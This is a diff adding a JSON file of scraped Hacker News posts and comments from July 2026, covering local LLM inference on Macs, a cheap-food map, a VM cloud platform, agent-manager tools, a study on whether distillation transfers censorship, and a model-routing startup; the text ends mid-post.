@@ -1,0 +1,742 @@
+{
+  "scraped_date": "2026-07-31",
+  "source": "hacker_news",
+  "total_scraped": 119,
+  "nontech_count": 23,
+  "posts": [
+    {
+      "id": "49098510",
+      "title": "Show HN: Open-source engine running Gemma 4 26B in 2 GB RAM on any M-series Mac",
+      "link": "https://github.com/drumih/turbo-fieldfare",
+      "domain": "github.com",
+      "author": "gitpusher42",
+      "score": 886,
+      "comment_count": 321,
+      "created_ts": 1785337543,
+      "is_internal": false,
+      "post_text": "Hi HN,<p>I built a specialized inference engine for running 4-bit Gemma 4 26B-A4B-IT on any M-series Mac using about 2 GB of RAM. It is called TurboFieldfare and is written in Swift and Metal.<p>I have always adored on-device AI. It feels like magic that you can run a powerful NN on your Mac or iPhone. So I wanted to push the limits a bit and run a model whose weights don’t fit in memory.<p>The model’s 4-bit quantized weights occupy roughly 14 GB, which makes running it with conventional inference tools almost impossible on an 8 GB or even 16 GB Mac once the OS, applications, and KV cache are included.<p>The trick is to keep the shared part of the model and the KV cache in RAM, then stream only the routed experts needed for each token from SSD. An SSD is way slower than RAM, so the runtime uses a small expert cache and bounded parallel `pread`. While those reads are in flight, the GPU runs the shared part of the layer.<p>I ran more than 100 experiments. Most didn’t work. A few got me here. The experiments are described in the GitHub repo.<p>It currently generates 5–6 tok&#x2F;s on an 8 GB M2 MacBook Air and 31–35 tok&#x2F;s on an M5 MacBook Pro.<p>I also added an experimental OpenAI-compatible local server. It supports streaming and tool calls, and reuses one prompt prefix from the KV cache.<p>Try it! The Mac app is easy to install. On the first run, it will download 15 GB of weights from Hugging Face. The model is surprisingly capable.<p>I would love any kind of feedback!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": [
+        {
+          "top": "Nice, I think this is the second time I see this here on HN, I always wondered why we need to shove the entire model into memory, I don't care who King Charles is every single time. It always felt as though we already figured out how to break up large files and parse them efficiently with very little memory.\nFrontier AI feels like its full of people who are brilliant at making models, but when it comes to scale and practicality, they just leave it to whoever sets up infrastructure to worry about. I wouldn't be surprised if frontier AI could be drastically cheaper if they just finetune and optimize their models to not consume all available RAM to only access less than 10% of the models knowledge.",
+          "author": "giancarlostoro",
+          "replies": [
+            {
+              "text": "I don't care who King Charles is every single time\nthat's the trick and a multi-billion dollar question, how would an llm engine know that? it's an active research area how to cull the initial layer surface and do the optimal traversal path through the layers and it's a damn hard problem. It's definitely an area where a ton of performance is left on the table still.",
+              "author": "Keyframe",
+              "depth": 1
+            },
+            {
+              "text": "The human analogy would be that I don’t remember everything in the books I have read, but I do recall reading a particular book and can always look it up.\nSo, is there a way to train a neural network and then tune it forget a lot of the facts that can be easily retrieved, but keep the intelligence.",
+              "author": "spot5010",
+              "depth": 2
+            },
+            {
+              "text": "LLMs can do that. The one that's built in to google search is relatively stupid, but it just uses web pages to fill in the gaps.\nThe downside is it is incredibly easy to be tricked by a single false bit of info.",
+              "author": "Gigachad",
+              "depth": 3
+            },
+            {
+              "text": "> So, is there a way to train a neural network and then tune it forget a lot of the facts that can be easily retrieved, but keep the intelligence.\nMoE (mixture of experts)?",
+              "author": "mandeepj",
+              "depth": 3
+            },
+            {
+              "text": "I guess that's why is an active research area, and an interdisciplinary one, what is intelligence? Is what have you practiced a ton of times? Is what you have purposely and efficiently practice? What is the implication of \"purposely\" doing something and how much memory is involved into it? If memory is involved how much of it is relevant? What is problem solving or wisdom? creativity? How much diversity in your memory do you need for creativity?\nSo what should you cull and how much?\nThere's already techniques in CNNs to trim unused or less active neuron paths to reduce a model's size, but how do you (and how much) do it in a general LLM? A product that will be used without supervision from a child to an 80yo elder?",
+              "author": "sdlion",
+              "depth": 3
+            }
+          ]
+        },
+        {
+          "top": "With my M1 MBA, I am still on macOS 15. To compile it, just remove the two lines with\n  opts.languageVersion = .version4_0\n\n\nor surround them with\n  if #available(macOS 26.0, *) {\n    opts.languageVersion = .version4_0\n  }\n\n\nYou'll miss out on a prefill speedup of 2.4x (as it yields 11.24x faster attention), according to the git comments, but it works. (On the 8-GPU-core MBA M1, I get 5-6 tok/s.)",
+          "author": "xenonite",
+          "replies": [
+            {
+              "text": "Thank you! That’s useful. I might try lowering the minimum version later.\nThe 2.4x prefill improvement will only work on the apple10 GPU family. The M1 uses apple7 as I remember",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "I'm looking forward to trying it, but not willing to upgrade to Tahoe, so I'd appreciate it for sure!",
+              "author": "wilj",
+              "depth": 2
+            },
+            {
+              "text": "To build this (on macOS 15) I also had to do this (in Package.swift):\n    @@ -4,8 +4,7 @@ import PackageDescription\n     let package = Package(\n         name: \"TurboFieldfare\",\n         platforms: [\n    -        .macOS(.v26),\n    -        .iOS(.v26),\n    +        .macOS(.v15)\n         ],\n         products: [\n             .library(name: \"TurboFieldfare\", targets: [\"TurboFieldfare\"]),",
+              "author": "tedd4u",
+              "depth": 1
+            },
+            {
+              "text": "Why are you still on 15?",
+              "author": "quasarj",
+              "depth": 1
+            },
+            {
+              "text": "I went back to 15 after accidentally upgrading to 26 because on MBA 13\" screen the new UI design uses a lot of extra padding everywhere wasting screen space which is already at a premium (especially vertical). Hoping 27 fixes a lot of these issues.",
+              "author": "tedd4u",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "Ran this on a 64 GB M4 Max MacBook. I figured having Gemma available with a small footprint would be a nice setup. No more unloading models when I need more RAM for work? Hell yea.\nGot 48 tok/s decode at 1.9 GB RSS (2.4 GB peak), faster than the 24 GB M5 Pro mentioned in the benchmarks. The ~2.0 GB/s SSD number quoted for M4 is the base chip. This M4 Max does ~7 GB/s.\nPage cache seems to be why it beats the M5 Pro. With 64 GB the whole 12 GB packed_experts set stays resident, and iostat shows only ~1.6 GB per run actually reaching disk, against the ~79 GB that 98 fully cold tokens would need.\nI then tested with DaVinci Resolve open and under load (playback): 42.6 tok/s. Also held 38 GB of incompressible memory to squeeze the page cache: 41.8. At 48 GB it ranged 32 to 41.5. Degrades gradually rather than a cliff. It's a beautiful thing.",
+          "author": "pwython",
+          "replies": [
+            {
+              "text": "Nice! Can you mention what kind of prefill numbers you’re seeing?",
+              "author": "anon373839",
+              "depth": 1
+            },
+            {
+              "text": "Thank you very much for sharing! Great results and useful info!",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "playback in Resolve would probably just use hardware decoding and barely hit your CPU or GPU. RAM usage would also not be much.",
+              "author": "pitchlatte",
+              "depth": 1
+            },
+            {
+              "text": "at that much ram you can just load it outright without tricks. it will be much faster even if it ends up swapping.",
+              "author": "sznio",
+              "depth": 1
+            },
+            {
+              "text": "M4 Max is typically better than M5 Pro for inference IIRC.",
+              "author": "fouc",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "I'm curious how your project compares to plain mmap!\nBecause llama.cpp will already run 26B in 2GB of RAM if you really want to (mmap enabled, repacking disabled).\nIt seems like the main difference is that your project synchronizes the SSD reads with inference activity, which you've presumably tuned to cause the least latency possible? Whereas the OS wouldn't care about any of that.",
+          "author": "tredre3",
+          "replies": [
+            {
+              "text": "My first version used plain `mmap`. On the 8 GB M2, a cold 3.36 MB expert took 10 ms with mmap and 2.8 ms with `pread`. The full simulation was 0.50tok/s for `mmap` vs 4 tok/s for `pread`\nWith `mmap`, OS loads pages reactively as the model touches them. It doesn’t know which experts were selected or when their reads could overlap with GPU work\nAnd common weights still use mmap for simplicity\nSo, I believe llama.cpp might run it under 2gb, but I assume it will be slower",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "hm. in linux you have MAP_POPULATE which forces a prefetch where macos relies on page faults and lazy loading. if MADV_WILLNEED doesn't help, maybe readv to vector read directly or mmap+writev (write to a dummy fd, with an iovec for each page, hopefully resulting in a one-syscall-big-pagefault for mmap.) maybe also experiment with a loop that just reads one byte from each relevant page after mmap but before real computation?",
+              "author": "a-dub",
+              "depth": 2
+            },
+            {
+              "text": "uh, tried most of this\nmmap benchmark did basically page touch experiment and cold reads were much slower, unfortunately (10ms vs 3ms)\nI tried MADV_WILLNEED, F_RDADVISE and preadv. preadv reduced parallelism because requested experts are rarely adjacent in the file.\npread is still the fastest. And I think Flash-Moe got the same result too",
+              "author": "gitpusher42",
+              "depth": 3
+            },
+            {
+              "text": "Any idea if madvise helps? Admittedly I have very limited experience and only on Linux",
+              "author": "nijave",
+              "depth": 2
+            },
+            {
+              "text": "I tried it. madvise didn't make mmap better than pread. I also tested F_RDADVISE, it helped on short decodes, but somehow got worse on longer decodes. Not very clear why, most likely problem somewhere at APFS and it is closed source and not much docs for it",
+              "author": "gitpusher42",
+              "depth": 3
+            }
+          ]
+        },
+        {
+          "top": "I have a project that's almost ready to run DiffusionGemma as well. The two project might potentially work well together. I'm getting ~20tok/s on a 36GB M3 and there's strong possibility we might be able to crib faster kernels from each other.\nFeel free to reach out.\n(currently at \nhttps://github.com/mmastrac/diffgemma\n but not in a releasable state yet)",
+          "author": "mmastrac",
+          "replies": [
+            {
+              "text": "Cool project! I looked into it recently and thought that running diffusion models locally doesn't really make sense: \nhttps://eamag.me/2026/why-parallel-diffusion-llms-are-slow-o...\nWhat are your thoughts on this?",
+              "author": "eamag",
+              "depth": 1
+            },
+            {
+              "text": "TBH, I think there's some truth to that. I spent _ages_ tuning the kernels to match the tested FLOP count of my M3's processor. I only have an M3 though and wasn't able to push int8 very far on it, but I think there's a chance that M5-class machines and higher might have more capability in this regard.\nWhat I also learned is that MLX/vLLM is probably within ~20% or so of the absolute max perf on Mac. I found some improvements over what they were doing, but we're at the point where it's challenging to optimize without per-stepping kernels.\nI found a few improvements over stock DiffusionGemma along the way, like using top-k attention, which drastically improves perf on my mac without sacrificing any of the benchmarks I was able to throw at it.\nFWIW some of the issues with Gemma being slow on Mac are specific choices they've made in the architecture that make it challenging to make use various optimizations that have popped up recently. I think a Kimi K3-style network hybrid with the diffusion bits of DiffusionGemma could have some serious sway.\nI think that diffusion still has an edge locally, but with some architecture tweaks and CPU improvements it would actually be a winner (ie: training the network for smaller token batch sizes or flexibility in attention heads, a less expensive attention mechanism, and others).",
+              "author": "mmastrac",
+              "depth": 2
+            },
+            {
+              "text": "It is super cool! Diffusion Gemma was released around the middle of my project, and I seriously considered switching to it. But I decided to finish the project as it was.\nI believe it would be a perfect match!\nFeel free to use any parts of my project or drop me a message. \nThere’s my LinkedIn link at the end of the readme. Or I will drop you a message later!",
+              "author": "gitpusher42",
+              "depth": 1
+            },
+            {
+              "text": "Awesome. I may need to finally bite the bullet and upgrade my macOS to test out the MPP approach you've taken.\nI've got a number of tiled-load kernels, and a top-k attention kernel that you might find interesting.",
+              "author": "mmastrac",
+              "depth": 2
+            },
+            {
+              "text": "I tried out one of the NVidia diffusion models, and from memory it only worked on MLX but seemed to leave a lot of features out. Would your work support non-Gemma models too?",
+              "author": "nl",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49100043",
+      "title": "Show HN: CheapFoodMap – A map of good meals under $10",
+      "link": "https://cheapfoodmap.com/",
+      "domain": "cheapfoodmap.com",
+      "author": "jaep1",
+      "score": 274,
+      "comment_count": 242,
+      "created_ts": 1785344392,
+      "is_internal": false,
+      "post_text": "I was recently laid off after 18 years, and gave myself 100 days to build soething useful in public. CheapFoodMap is a crowdsourced map of meal under $10, excluding franchises, local good eats only.<p>It&#x27;s inspried by 거지맵 (Begger&#x27;s Map) a Korean crowdsourced map students use to find cheap eats.<p>Ocverage is heaviest in Texas, since I live in Dallas, but have 1200 meals across 15 US cities. Seed data came from Google Review, 4.2 star or higher with at least 500 reviews, and verified price under $10 per menu item.<p>Things I would love feedback on : whether the price-freshness model makes sense, and what would make you trust the price on a site like this. How to encourage people to update prices, since inflation is making food price very frequent.<p>https:&#x2F;&#x2F;cheapfoodmap.com<p>Any and all suggestion will be super helpful. Thank you!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49099434",
+      "title": "Show HN: Kedge – Full-stack cloud with forkable VM snapshots and global SQLite",
+      "link": "https://kedge.dev/",
+      "domain": "kedge.dev",
+      "author": "wgjordan",
+      "score": 97,
+      "comment_count": 20,
+      "created_ts": 1785341757,
+      "is_internal": false,
+      "post_text": "I&#x27;m building Kedge, a globally distributed platform for stateful serverless apps. Here&#x27;s how you make a simple static site: `echo &#x27;# Hello world!&#x27; | ssh kedge.dev`<p>I helped build Fly.io for 4 years and shared enthusiasm for the founders&#x27; vision of a &#x27;global Heroku&#x27;.  While there, I wrote &quot;The Serverless Server&quot; (<a href=\"https:&#x2F;&#x2F;fly.io&#x2F;blog&#x2F;the-serverless-server&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;fly.io&#x2F;blog&#x2F;the-serverless-server&#x2F;</a>) as a study of Lambda and a sketch of a modern serverless product built around lightweight VMs. That essay was the initial inspiration for Kedge.<p>Kedge has a fast VM orchestrator that can create code sandboxes or scale service instances in 3ms, using a combination of forkable VM snapshots and a tree of warm pools (Linux kernel -&gt; base runtime -&gt; app). VMs are memory-dense thanks to shared copy-on-write memory pages. You can run lightweight CGI-style functions, public OCI images, or source code for BuildKit to compile and deploy.<p>Kedge&#x27;s global control plane sits on an eventually-consistent SQLite database. Taking inspiration from Corrosion and Litestream, I built a local-first, multi-writer CRDT-based replication system backed by object storage, and just recently made it open source (<a href=\"https:&#x2F;&#x2F;github.com&#x2F;wjordan&#x2F;syzy\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;wjordan&#x2F;syzy</a>).<p>You can also use a SQLite client to query `&#x2F;shared.db` from any instance for a build-in replicated database in your app. This lets Kedge autoscale services close to your users while each instance queries its local replica for eventually-consistent data, with no need to micro-manage instance or volume placement. (There&#x27;s also a &#x2F;shared&#x2F; filesystem adapter for convenience.)<p>Kedge can even use this same database for stateful, server-rendered HTML apps. Data attributes bind forms, buttons, and values to records in the app database, Kedge compiles the schema and operations at deploy-time, and then queries the local data to serve requests. As a demo, I made a Hacker News clone with story submission, votes, comments and auth in about 60 lines of Markdown, plus CSS (<a href=\"https:&#x2F;&#x2F;kedge.dev&#x2F;docs&#x2F;html-apps#kedger-news\" rel=\"nofollow\">https:&#x2F;&#x2F;kedge.dev&#x2F;docs&#x2F;html-apps#kedger-news</a>).<p>I&#x27;ve just started collecting public feedback, so please let me know what you think! I&#x27;m particularly interested in feedback on the stateful HTML app model, which is the newest (and most ambitious) piece. The preview is currently running in 11 regions for you to kick the tires. There&#x27;s no billing yet, so the pricing page is an estimate. Thanks for taking a look!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": [
+        {
+          "top": "Built in replicated database and filesystem is pretty rad.  Fly leaves this as an exercise for the user.\nYou should license the backend to enterprises that want a cheaper/lighter weight option to kubernetes for the surge of agentically coded internal apps.",
+          "author": "siliconc0w",
+          "replies": []
+        },
+        {
+          "top": "This looks awesome! I really love the clean and minimalist website design too.\nI've been excited about using (lib)krun as a drop in replacement for crun/runc for container engines, to make them run qemu microvms. I'm exploring what it could look like if every process of an OS ran like that. I envy you, would love to work on something like this!",
+          "author": "sureglymop",
+          "replies": []
+        },
+        {
+          "top": "https://kedge.dev/docs/sandboxes\nCaught my eye with this one. I'll be taking a closer look as this is one of those \"I'd rather let someone else do it.\" type infrastructure bits :)",
+          "author": "nicksuperb",
+          "replies": [
+            {
+              "text": "Thanks! I tried to make the sandbox-eval stdin interface as simple as possible so you could easily plug it anywhere. The executable docs run an actual full shell in a VM, since they're so fast and cheap to spin up- I hope the example made it clear how to use this feature!",
+              "author": "wgjordan",
+              "depth": 1
+            },
+            {
+              "text": "This is also extremely interesting to me.\nAn instant, ephemeral cloud sandbox is pretty handy.",
+              "author": "devmor",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "Hey this is amazing! I see the sqlite db is replicated but how does it handle multiple instances as writers? Curious if the underlying sqlite engine is syzy or if there's other restrictions to be aware of",
+          "author": "gandreani",
+          "replies": [
+            {
+              "text": "Thanks! Yes, the write-replication part is syzy, which hooks into the standard unmodified sqlite engine that reads and writes normal sqlite db files locally - syzy just keeps multiple instances in sync by capturing writes and applying them elsewhere.\nIt handles multiple writers by capturing changes as logical operations, then resolving conflicts in a globally-deterministic order based on their contents based on a CRDT model.\nThere are some limitations (see \nhttps://github.com/wjordan/syzy/blob/main/sqlite/docs/LIMITA...\n), mostly around primary keys (they have to be non-NULL) and UNIQUE constraints (there's some subtle differences in behavior between nullable and NOT NULL uniqueness). But in general, the goal is for all of SQLite, DML and DDL, to just work normally!",
+              "author": "wgjordan",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "> Billed per-second on actual resources consumed, … memory tracks active resident pages\nWait, are you saying it has dynamic vertical scaling of RAM?",
+          "author": "tomComb",
+          "replies": [
+            {
+              "text": "Pretty much! It's not dynamic memory hotplug or resizing, just dynamic billing. Usage is based on the actual RSS used by the app so you can think of the VM's defined size as just a limit, for both CPU and RAM. This means you don't have to spend time profiling and right-sizing instances to optimize costs, just make your application fast and efficient and don't worry about it!",
+              "author": "wgjordan",
+              "depth": 1
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49107749",
+      "title": "Agent-Manager: A Tmux TUI for Running Claude Code, Codex and OpenCode",
+      "link": "https://github.com/YoanWai/agent-manager",
+      "domain": "github.com",
+      "author": "yoanwaidev",
+      "score": 95,
+      "comment_count": 75,
+      "created_ts": 1785404067,
+      "is_internal": false,
+      "post_text": "",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "manager"
+      ],
+      "comments": [
+        {
+          "top": "There seem to be a lot of these sorts of tools popping up but it’s not clear to me the added value they bring in over using plain tmux (or any other “normal” session multiplexer).\nCan someone who uses one of these agent-specific multiplexers share their experience and reasoning for reaching for / building these? What makes this better than a normal multiplexer? I am asking in earnest; I just don’t understand but I want to.",
+          "author": "hamaluik",
+          "replies": [
+            {
+              "text": "I've tested out just about every tool like this, and ended up coding my own, it is really minimal though.\nThe primary reason people reach for these tools are two to three reasons:\n1. Tmux does not natively show agent statuses of agents / notify you when one needs input. Helpful when you have a huge list of small things to fix: I just spin up N agents in parallel to handle all of them, then I go over and review.\n2. Tmux does not handle worktree handling. If you wanna make changes in parallel you cannot have two agents make db migrations at the same time. The way to solve for this is to have them work on two different worktrees with separate environments, ports etc.\n3. Tmux tree view is not super beautiful, especially for viewing agents.\nI built this as a tmux plugin since I don't really want to opt-out of tmux as a whole, especially since I like my keybindings there.\nhttps://github.com/Ymirke/tmux-agent-switcher",
+              "author": "ymir_e",
+              "depth": 1
+            },
+            {
+              "text": "In your experience using your plugin (and the other tools that do something similar like herdr), does it make doing a larger volume of work feel more manageable?\nIn my experience thus far, surfacing/managing session state is only part of the issue, context switching between them is another entirely and feels like the real productivity bottleneck for me",
+              "author": "Arthurian",
+              "depth": 2
+            },
+            {
+              "text": "You're spot on here.\nIf you're truly multi-tasking with this type of setup it feels more like \"tiktok coding\", \"brainrot coding\", or any other term that should be used for it.\nI'm pretty sure we're moving away from it, the agent you interact with via voice or typing will go to a higher and higher abstraction level, and you won't have to effectively micro-manage them.",
+              "author": "ymir_e",
+              "depth": 3
+            },
+            {
+              "text": "> The way to solve for this is to have them work on two different worktrees with separate environments, ports\nWhat are you using for the environment part? Containers?",
+              "author": "apitman",
+              "depth": 2
+            },
+            {
+              "text": "This looks nice, but I think a screenshot or three in the README would help bring it to life better",
+              "author": "petesergeant",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "How does this compare to something like herdr which does all of this?\nhttps://github.com/herdrdev/herdr",
+          "author": "aghuang",
+          "replies": [
+            {
+              "text": "I tried herdr recently, and I missed many tmux features I really liked.\ntmux has a better `prefix-[` mode where you \n1) can do visual selection using line/block mode\n2) you can use `o` to switch to other side (just like vim)\n3) it pauses/freezes the state of the output so you have time to capture\nIn herdr, its very basic and incomplete if you're a vim/nvim/tmux power user.  And if you're in a TUI that shows some text and then hides it, its hard to do the selection in herdr before it disappears.\nTo give herdr credit, I did like it's `prefix-e` which opens the history in vim so you can you real selection utils.\nAs I was looking at herdr, I found there many other solutions that were like it built on the more robust tmux.  I am still evaluating, but there are plenty of solutions that have hooks to observe what's going on in agents in other panes/windows like herdr.\nI like the Primeagen's `tmux sessionizer` style solutions for nvim to work with git worktrees that each agent may be in. And I like the tmux-agent-sidebar.",
+              "author": "darcyparker",
+              "depth": 1
+            },
+            {
+              "text": "Same here, I do not see the point of herdr if you're already using tmux. It's very easy to add hooks to your favorite harness to display a notification in tmux when it's done working.",
+              "author": "phito",
+              "depth": 2
+            },
+            {
+              "text": "I started using herdr last night, and was able to get a workflow I've wanted to set up for a while working, which is to be able to talk to a managing agent in my car and check on / update claude sessions. It uses Telnyx SIP and LiveKit cloud, and I'm using Qwen3.6 35B-A3B quite successfully as the voice layer router. It's still very early but it works quite well.\nIf you decide to try it out, please make sure to read the security implications. There is no sandboxing added as of yet, and guardrails are pretty minimal.\nhttps://github.com/jonesy827/mate",
+              "author": "jonesy827",
+              "depth": 1
+            },
+            {
+              "text": "yes exactly my thought. They're quite the same, a feature more a feature less",
+              "author": "lakardion",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "This looks good, but I prefer a desktop application like Codex (wish I could run Claude Code in Codex lol)",
+          "author": "williamjinq",
+          "replies": []
+        },
+        {
+          "top": "This looks really good, but for me the timing of seeing agent-manager is bad: I read about the similar Herdr on HN several days ago and I have completely changed my dev setup for the better.\nI have always been a traditional simple command line tool kind of developer (I am an old man, old habbits die hard!) but I recommend at least a one day experiment with tools like agent-manager and/or Herdr that integrate tools like Claude Code and OpenCode into an integrated work environment.\nI have been hacking on my own Emacs based agentic coding and work environment (so much fun!) but my recent experience with Herdr has been much more productive.\nAnyway, the docs for agent-manager look good, I look forward to reading HNer’s experience with it.",
+          "author": "mark_l_watson",
+          "replies": [
+            {
+              "text": "Do you know how does Herdr compare to native “claude agents” view?",
+              "author": "aranelsurion",
+              "depth": 1
+            },
+            {
+              "text": "Thanks for sharing your experience with Herdr!  I've been considering taking the plunge for a few weeks - going to do a one day experiment today.",
+              "author": "urnicus",
+              "depth": 1
+            },
+            {
+              "text": "do so! I'm quite happy with how it works. I'm using it with Ghostty and it works flawlessly. I have OOM from time to time but that is just me doing too many things. Never had I had any UI issues with it, and the UI showing the current agent status separately from the workspaces themselves is really useful",
+              "author": "lakardion",
+              "depth": 2
+            }
+          ]
+        },
+        {
+          "top": "Isn't this what \nhttps://www.superlogical.com/\n supposed to accomplish?",
+          "author": "lucianmarin",
+          "replies": [
+            {
+              "text": "yes but if you don't create a company you can't get funding.",
+              "author": "figmert",
+              "depth": 1
+            },
+            {
+              "text": "You don't need funding or teams to make these types of tools anymore, they are all basically engineering as marketing for running agents in the cloud, or some other value add/funnel into something that could make money.\ncodex(or whatever they're calling the bundled desktop experience) = selling inference\nclaude code = selling inference\nconductor = selling hosted agents\nsuperlogical = selling... something\nI recommend everyone build their own. It's fun, you'll learn a bit, and assuming you work as a software engineer the dogfooding is built in. I built ouijit as my own example of this: \nhttps://ouijit.com\n & \nhttps://github.com/ouijit/ouijit\n (note that I am not trying to make money, just free as in libre AND beer)",
+              "author": "pbjerkeseth",
+              "depth": 2
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "49113599",
+      "title": "Show HN: Distilling DeepSeek into GPT-OSS doesn't transfer censorship. Try it",
+      "link": "https://www.ctgt.ai/research/distillation-censorship-transfer",
+      "domain": "www.ctgt.ai",
+      "author": "cgorlla",
+      "score": 92,
+      "comment_count": 63,
+      "created_ts": 1785435186,
+      "is_internal": false,
+      "post_text": "We recently used DeepSeek V4 Flash as a teacher for finance tasks with GPT-OSS-120B. Distillation works well on this problem. At a constrained 8k token budget, our self-distilled 120B scores 83.61% on FinanceReasoning, above Kimi K3 (81.93%) and Inkling (65.13%). We released the 20B open weights. With V4 as the teacher though, we realized it would be timely to measure if the censorship characteristic of it transferred to the distilled version of the base model. tl;dr it didn&#x27;t, the teacher answered politically sensitive questions 7 SDs differently than expected, but the distilled model&#x27;s behavior remained the same as its American base. You can try a couple queries yourself with no auth here: <a href=\"http:&#x2F;&#x2F;playground.ctgt.ai&#x2F;\">http:&#x2F;&#x2F;playground.ctgt.ai&#x2F;</a><p>I will now dive in to the motivation, methodology and detailed results for those interested. The hard part of measuring this phenomena is isolating whether a model is reluctant to talk about sensitive things generally vs. a particular country&#x27;s sensitive things. So we made 152 matched pairs where one prompt asked about a Chinese concept, and the other asked about a non-Chinese version of that concept. For example, the Great Leap Forward vs. the Holodomor. These were scored 0-100 by four LLM judges (Grok 4.20, Gemini 3.5 Flash, GPT-5 mini, Claude Sonnet 4.6), validated against 96 human scores at r=0.948. OpenRouter blocked some of these so we hosted the weights ourselves.<p>The teacher&#x27;s gap on the core political set of pairs was +45.45 points, ~7 standard deviations from chance, and every distilled student was within 1 point of its base. Subliminal learning literature says this is expected when the initializations are not shared between teacher and student, which is true here. The distillation data also did not contain any China-sensitive content. The contribution here was to release the evaluation framework (LineageEval: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;CTGT-Inc&#x2F;lineage-eval&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;CTGT-Inc&#x2F;lineage-eval&#x2F;</a>) to elevate the discussion around this topic in DC and beyond. We are an interpretability lab working on high risk and regulated applications of AI, so we hear a lot of vagaries aimed at the supposed dangers of distilling Chinese models on American bases. We believe these conversations should be based on open, auditable frameworks and not feelings. We plan to test what happens with a Chinese teacher into a Chinese-lineage base like Qwen next.<p>The distillation method was an evolution of HINT-SD where we inject a hint at the specific point the model makes a mistake in its reasoning. Then we train on the corrected continuation with reverse KL over the next 100 toks of the rollout. As mentioned above 120B itself was efficacious as a teacher, and we ended up shipping this version. The self-distilled 120B scores 83.61% on FinanceReasoning, above Kimi K3 (81.93%) and Inkling (65.13%). Ours finishes 98.7% of problems in budget; the larger models truncate (90.76% and 71.01%) which score as incorrect. At 100k tokens big models gain (Kimi 89.92%). So for a finance task at a constrained (perhaps more realistic) budget a 120B on one H100 at ~$0.00026&#x2F;query outpaced models running 62-160x more per query.<p>We put out the 20B finance model as open weights (64.71% to 74.79% at 8k on FinanceReasoning, 23% lower cost&#x2F;query, runs on one 80GB GPU), the 120B in a playground with teacher and students side by side (a few queries, no auth), and LineageEval with all prompts, controls, rubric, and code.<p>We are curious to hear experiences from those working with distilled Chinese models in prod, or if you have thoughts on improvements to LineageEval.<p><a href=\"https:&#x2F;&#x2F;huggingface.co&#x2F;ctgt-inc&#x2F;gpt-oss-20b-finance\" rel=\"nofollow\">https:&#x2F;&#x2F;huggingface.co&#x2F;ctgt-inc&#x2F;gpt-oss-20b-finance</a><p><a href=\"https:&#x2F;&#x2F;playground.ctgt.ai&#x2F;\">https:&#x2F;&#x2F;playground.ctgt.ai&#x2F;</a><p><a href=\"https:&#x2F;&#x2F;github.com&#x2F;CTGT-Inc&#x2F;lineage-eval&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;CTGT-Inc&#x2F;lineage-eval&#x2F;</a><p><a href=\"https:&#x2F;&#x2F;www.ctgt.ai&#x2F;research&#x2F;distillation-censorship-transfer\">https:&#x2F;&#x2F;www.ctgt.ai&#x2F;research&#x2F;distillation-censorship-transfe...</a>",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "motivation",
+        "mistake"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49099143",
+      "title": "Launch HN: Tokenless (YC S26) – Automatic model switching to save money",
+      "link": "https://usetokenless.com/",
+      "domain": "usetokenless.com",
+      "author": "rohaga",
+      "score": 69,
+      "comment_count": 59,
+      "created_ts": 1785340527,
+      "is_internal": false,
+      "post_text": "Hi HN, Rohit here from Tokenless (<a href=\"https:&#x2F;&#x2F;usetokenless.com&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;usetokenless.com&#x2F;</a>), which I’m building alongside co-founders Andrew and Kev. We’re building an API gateway which routes agent traffic dynamically turn-by-turn between different models to save on AI spend.<p>The cost of AI tokens is top-of-mind for many. Companies like Uber and Salesforce have been complaining about blowing their yearly AI spend faster than expected.<p>Frontier models are amazing for dev work, but are so expensive. Open-source models are cheap and rapidly improving, closing the gap with frontier models, but aren’t quite there yet.<p>Tokenless gets you the best of both worlds–routing harder turns to smarter models only when needed, which keeps costs low.<p>Before Tokenless, I was doing a PhD at Princeton. While using coding&#x2F;other agents, I constantly agonized over model choice, to make sure my AI spend was going as far as possible on my academic Cursor account.<p>At the same time, I was doing LLM research, and a small technique I developed while in recovery from NeurIPS submission season seemed to hit SOTA pretty fast. I was surprised that such simple ideas could do routing well.<p>We’ve been able to develop a version of the router that matches the performance of Claude Fable 5 at half the cost. The blog post on our website explores the technical details on how we did this (<a href=\"https:&#x2F;&#x2F;usetokenless.com&#x2F;blog&#x2F;building-tokenless&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;usetokenless.com&#x2F;blog&#x2F;building-tokenless&#x2F;</a>).<p>Highlights:\n- Our approach queries multiple models at once and uses their progress to make decisions (this technique is novel AFAIK, let us know if you know anyone else doing this).\n- Switching models doesn’t destroy the cache if the routing algorithm is aware of when the cache is hot&#x2F;cold.<p>To come:\n- Adding Kimi K3, all other GPT efforts and more to the router<p>Go ahead and sign up on usetokenless.com and try using Tokenless with your agent, you’ll get $20 of free credit. Here’s a demo on how to use it: <a href=\"https:&#x2F;&#x2F;youtu.be&#x2F;sjZWriclcls\" rel=\"nofollow\">https:&#x2F;&#x2F;youtu.be&#x2F;sjZWriclcls</a><p>Tokenless provides frontier-level intelligence for cheaper, so we’d love some feedback on how it feels to use, any corner cases that the router routes incorrectly, and whether you find the routing problem 